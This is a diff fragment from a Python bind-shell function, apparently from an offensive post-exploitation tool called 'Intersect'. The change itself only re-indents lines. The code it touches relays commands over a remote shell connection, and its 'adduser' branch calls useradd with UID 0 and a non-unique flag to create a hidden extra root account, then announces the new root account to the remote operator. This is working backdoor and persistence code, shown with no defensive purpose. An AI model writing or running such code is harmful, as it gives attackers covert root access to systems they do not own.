@@ -520,10 +520,10 @@ def bindShell():
             os.chdir(cmd[3:].replace('\n',''))
             conn.send("\nIntersect"+str(os.getcwd())+" $ ")
         elif cmd.startswith('adduser'):
-           strip = cmd.split(" ")
-           acct = strip[1]
-           os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-           conn.send("[!] Root account " + acct + " has been created.")   
+            strip = cmd.split(" ")
+            acct = strip[1]
+            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
+            conn.send("[!] Root account " + acct + " has been created.")   
         elif proc:
             conn.sendall( stdout )
             conn.send("\nIntersect"+str(os.getcwd())+" $ ")
